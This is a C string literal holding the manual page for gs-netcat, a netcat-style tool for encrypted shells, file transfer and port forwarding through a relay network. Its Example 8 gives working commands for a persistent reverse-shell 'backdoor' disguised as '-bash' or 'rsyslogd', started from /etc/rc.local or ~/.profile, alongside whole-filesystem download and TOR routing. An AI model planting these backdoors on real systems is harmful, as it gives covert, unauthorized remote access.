const char *man_str = "\
GS-NETCAT(1)		     General Commands Manual		    GS-NETCAT(1)\n\
\n\
NAME\n\
     gs-netcat – transfer data, forward traffic and execute commands on a remote\n\
     host. Securely.\n\
\n\
SYNOPSIS\n\
     gs-netcat [-rlgvqwCTSDiu] [-s secret] [-k keyfile] [-L logfile] [-d IP]\n\
	       [-p port] [-e cmd]\n\
\n\
DESCRIPTION\n\
     The gs-netcat utility is a re-implementation of netcat. It allows two or\n\
     more users to establish a secure TCP connection with each other in a\n\
     scenario where all users are behind NAT/Firewall and would not be able to\n\
     connect to each other directly. Typically a connection between one\n\
     workstation and another workstation on a different Local Area Network.\n\
\n\
     It uses the Global Socket Relay Network (GSRN) instead of direct TCP\n\
     connections. Neither workstation needs to open a port in their firewall or\n\
     accept incoming TCP connections.\n\
\n\
     The connection is end-2-end encrypted using SRP (RFC 5054) with AES-256 and\n\
     a 4096 Prime. The GSRN sees only the encrypted traffic.\n\
\n\
     Common uses include:\n\
\n\
	   •   simple TCP proxies\n\
	   •   PTY shell\n\
	   •   File transfer\n\
	   •   a SOCKS ProxyCommand for ssh(1)\n\
	   •   and much, much more.\n\
\n\
OPTIONS\n\
     -C      Disable encryption and use clear-text instead. Use with caution.\n\
\n\
     -d ip   Destination IPv4 address for port forwarding.\n\
\n\
     -D      Daemon & Watchdog mode. Start gs-netcat as a background process and\n\
	     restart if killed.\n\
\n\
     -e cmd  Execute command and send output to the connected client. Needs -l.\n\
\n\
     -g      Generate a secure random password and output it to standard output.\n\
\n\
     -i      Interactive login shell. The server spawns a true PTY login shell.\n\
	     The client acts as a true PTY client (with Ctrl-C etc working). The\n\
	     client can terminate the session by typing 'Ctrl-e q' at any time\n\
	     or by typing 'exit'. The server supports multiple clients at the\n\
	     same time.\n\
\n\
     -k file\n\
	     A file containing the password.\n\
\n\
     -l      Server/Listening mode. The default mode is client.\n\
\n\
     -L file\n\
	     Log file [default: standard out]\n\
\n\
     -p port\n\
	     Port to listen on or to forward traffic to [1-65535].\n\
\n\
     -q      Quiet mode. Do not output any warnings or errors.\n\
\n\
     -r      Receive-only. Do not send any data. Terminate when no more data is\n\
	     available for reading.\n\
\n\
     -s secret\n\
	     A password chosen by the user. Both users need to use the same\n\
	     password to connect.\n\
\n\
     -S      Act as a SOCKS4/4a/5 server. The server acts as a SOCKS4/4a/5\n\
	     proxy. It allows multiple gs-netcat clients to (securely) relay\n\
	     traffic via the server. Needs -l.\n\
\n\
     -T      Use TOR. The gs-netcat tool will connect via TOR to the GSRN. This\n\
	     requires TOR to be installed and running. The IP and PORT of the\n\
	     TOR server can be set using environment variables.\n\
\n\
     -u      Use UDP instead of TCP for port forwarding. Needs -p.\n\
\n\
     -v      Prints status messages. Use -vv to be more verbose and -vvv to be\n\
	     insanely verbose.\n\
\n\
     -w      Client to wait for the listening server to become available.\n\
\n\
CONSOLE\n\
     The interactive login shell ( -i ) has a command console. Pressing 'Ctrl-e\n\
     c' (e for EEEElite) opens the command console. The command console displays\n\
     the following information:\n\
\n\
	   •   Latency (in milliseconds) to the remote host\n\
	   •   Warning when a user logs into the system or becomes active\n\
	   •   Data throughput\n\
	   •   File transfer logs\n\
     Type 'help' for a list of available commands.\n\
\n\
FILETRANSFER\n\
     File transfer is available from the command console. Files are transferred\n\
     with the permission and modification timestamp unchanged. Partially\n\
     transferred files are re-started where the transfer was left off.	The\n\
     'put' command is used for uploading:\n\
	   put foobar.txt\n\
	   put $HOME/foobar.txt\n\
	   put /tmp/*.log\n\
	   put $(find. -type f -name '*.c')\n\
     (The above example shows Shell Variable substitution and word expansion) It\n\
     is possible to limit the amount of path information that is sent as implied\n\
     directories for each path you specify. You can insert a dot and a slash\n\
     into the source path, like this:\n\
	   put /foo/./bar/baz.c\n\
     That would create /tmp/bar/baz.c on the remote machine.  The 'get' command\n\
     is used for downloading:\n\
	   get foobar.txt\n\
	   get $(find /var/./ -name '*.log')\n\
     Transferring a directory automatically transfers all files and directories\n\
     within that directory (recursively):\n\
	   get /var/log\n\
	   get /\n\
     The first command transfers all directories and files in /var/log/*. The\n\
     latter command transfers the entire filesystem.  Multiple get/put commands\n\
     can be scheduled at the same time.\n\
\n\
EXAMPLES\n\
     Example 1 - Listen for a new connection using the password 'MySecret':\n\
	   $ gs-netcat -s MySecret -l\n\
\n\
     Connect with client using the same password:\n\
	   $ gs-netcat -s MySecret\n\
\n\
     Example 2 - spawn a PTY login shell when a client connects:\n\
	   $ gs-netcat -s MySecret -l -i\n\
\n\
     Log in to server's interactive shell:\n\
	   $ gs-netcat -s MySecret -i\n\
\n\
     Example 3 - Execute a command when a client connects:\n\
	   $ gs-netcat -s MySecret -l -e 'echo hello world; id; exit'\n\
\n\
     Connect client to the server:\n\
	   $ gs-netcat -s MySecret\n\
\n\
     Example 4 - Pipe data from client to server:\n\
	   $ gs-netcat -s MySecret -l -r >warez.tar.gz\n\
\n\
     Client to read 'warez.tar.gz' and pipe it to the server.\n\
	   $ gs-netcat -s MySecret <warez.tar.gz\n\
\n\
     Example 5 - Server to act as a SOCKS4/4a/5 server:\n\
	   $ gs-netcat -s MySecret -l -S\n\
\n\
     Client to listen on TCP port 1080 and forward any new connection to the\n\
     server's SOCKS server:\n\
	   $ gs-netcat -s MySecret -p 1080\n\
\n\
     Example 6 - TCP Port Forward all connections to 192.168.6.7:22. Server:\n\
	   $ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22\n\
\n\
     Client to listen on TCP port 2222 and forward any new connection to the the\n\
     server. The server then forwards the connection to 192.168.6.7:22.\n\
	   $ gs-netcat -s MySecret -p 2222\n\
	   $ ssh -p 2222 root@127.0.0.1\n\
\n\
     The same using 1 command:\n\
	   $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored\n\
\n\
     Example 7 - Creating an SFTP server using gs-netcat:\n\
	   $ gs-netcat -s MySecret -l -e /usr/lib/sftp-server\n\
\n\
     The sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp\n\
     binary also speaks sftp-protocol to stdin/stdout. The tool can be used to\n\
     connect both via GSRN (encrypted) and access the SFTP server running on the\n\
     server's side from the client via the GSRN (encrypted).:\n\
	   $ export GSOCKET_ARGS='-s MySecret'\n\
	   $ sftp -D gs-netcat\n\
\n\
     Example 8 - Encrypted Reverse PTY shell hidden as '-bash' in the process\n\
     list - also known as 'backdoor':\n\
	   $ (GSOCKET_ARGS=\"-s MySecret -liqD\" exec -a -bash gs-netcat)\n\
\n\
     The following line in /etc/rc.local starts the backdoor after each system\n\
     reboot:\n\
	   GSOCKET_ARGS=\"-s MySecret -liqD\" HOME=/root TERM=xterm-256color\n\
	   SHELL=\"/bin/bash\" /bin/bash -c \"cd $HOME; exec -a rsyslogd\n\
	   /usr/local/bin/gs-netcat\"\n\
\n\
     The following line in /etc/rc.local starts a port-forward to 127.0.0.1:22:\n\
	   GSOCKET_ARGS=\"-k MySecret2 -lqD -d 127.1 -p22\" /bin/bash -c \"exec -a\n\
	   rsyslogd /usr/local/bin/gs-netcat\"\n\
\n\
     The following line in the user's ~/.profile starts the backdoor (once) when\n\
     the user logs in. All in one line:\n\
	   killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS=\"-s MySecret3\n\
	   -liqD\" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)\n\
\n\
     The '(...)' brackets start a sub-shell which is then replaced (by exec)\n\
     with the gs-netcat process. The process is hidden (as -bash) from the\n\
     process list.\n\
\n\
     Client to connect to the backdoor:\n\
	   $ gs-netcat -s MySecret -i\n\
\n\
ENVIRONMENT\n\
     The following environment variables can be set to control the behavior of\n\
     gs-netcat\n\
\n\
     GSOCKET_SOCKS_IP\n\
	   Specify the IP address of the TOR server (or any other SOCKS server).\n\
	   Default is 127.0.0.1.\n\
\n\
     GSOCKET_SOCKS_PORT\n\
	   The port number of the TOR server (or any other SOCKS server).\n\
	   Default is 9050.\n\
\n\
     GSOCKET_ARGS\n\
	   A string containing additional command line parameters. First the\n\
	   normal command line parameters are processed and then the command\n\
	   line parameters from GSOCKET_ARGS.\n\
\n\
SECURITY\n\
     Passing the password as command line parameter is not secure. Consider\n\
     using the -k option or GSOCKET_ARGS or enter the password when prompted:\n\
\n\
	   $ gs-netcat -k <file>\n\
\n\
	   $ export GSOCKET_ARGS=\"-s MySecret\"\n\
	   $ gs-netcat\n\
\n\
     1. The security is end-2-end. This means from User-2-User (and not just to\n\
     the GSRN). The GSRN relays only (encrypted) data to and from the users.\n\
\n\
     2. The session is 256 bit and ephemeral. It is freshly generated for every\n\
     session and generated randomly (and is not based on the password). It uses\n\
     OpenSSL's SRP with AES-256 and a 4096 Prime.\n\
\n\
     3. The password can be 'weak' without weakening the security of the\n\
     session. A brute force attack against a weak password requires a new TCP\n\
     connection for every guess.\n\
\n\
     4. Do not use stupid passwords like 'password123'. Malice might pick the\n\
     same (stupid) password by chance and connect. If in doubt use gs-netcat -g\n\
     to generate a strong one. Alice's and Bob's password should at least be\n\
     strong enough so that Malice can not guess it by chance while Alice is\n\
     waiting for Bob to connect.\n\
\n\
     5. If Alice shares the same password with Bob and Charlie and either one of\n\
     them connects then Alice can not tell if it is Bob or Charlie who\n\
     connected.\n\
\n\
     6. Assume Alice shares the same password with Bob and Malice. When Alice\n\
     stops listening for a connection then Malice could start to listen for the\n\
     connection instead. Bob (when opening a new connection) can not tell if he\n\
     is connecting to Alice or to Malice. Use -a <token> if you worry about\n\
     this. TL;DR: When sharing the same password with a group larger than 2 then\n\
     it is assumed that everyone in that group plays nicely. Otherwise use SSH\n\
     over the GS/TLS connection.\n\
\n\
     7. SRP has Perfect Forward Secrecy. This means that past sessions can not\n\
     be decrypted even if the password becomes known.\n\
\n\
NOTES\n\
     The latest version is available from\n\
     https://github.com/hackerschoice/gsocket/.\n\
\n\
SEE ALSO\n\
     gsocket(1), gs-sftp(1), gs-mount(1), blitz(1), nc(1), socat(1)\n\
\n\
BUGS\n\
     Efforts have been made to have gs-netcat \"do the right thing\" in all its\n\
     various modes. If you believe that it is doing the wrong thing under\n\
     whatever circumstances, please notify me (skyper@thc.org) and tell me how\n\
     you think it should behave.\n\
\n\
macOS 12.4			 October 8, 2020		      macOS 12.4\n\
";
